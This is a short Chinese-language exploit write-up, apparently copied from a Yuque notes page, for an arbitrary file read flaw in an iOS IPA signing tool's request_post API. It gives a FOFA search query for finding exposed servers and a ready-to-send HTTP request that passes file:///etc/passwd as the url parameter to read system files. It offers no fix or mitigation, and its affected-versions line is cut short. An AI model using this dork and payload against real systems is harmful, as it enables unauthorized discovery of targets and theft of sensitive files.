# 苹果IOS端IPA签名工具request_post任意文件读取漏洞

# 一、漏洞简介
苹果IOS端IPA签名工具request_post任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。

# 二、影响版本
+ 苹果IOS端IPA签名工具r

# 三、资产测绘
+ fofa`body="/assets/index/css/mobileSelect.css"`
+ 特征

![1727408181627-7dd57a7d-22a5-477e-b7c2-290f545d0933.png](./img/b5h66i7l2NQvoD5j/1727408181627-7dd57a7d-22a5-477e-b7c2-290f545d0933-666408.png)

# 四、漏洞复现
```java
GET /api/index/request_post?url=file:///etc/passwd&post_data=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close
```

![1727408257756-4dc51a62-813c-4540-b5bb-8260cd03159d.png](./img/b5h66i7l2NQvoD5j/1727408257756-4dc51a62-813c-4540-b5bb-8260cd03159d-058160.png)





> 更新: 2024-10-22 09:36:08  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/haxm2dna8vo9em9h>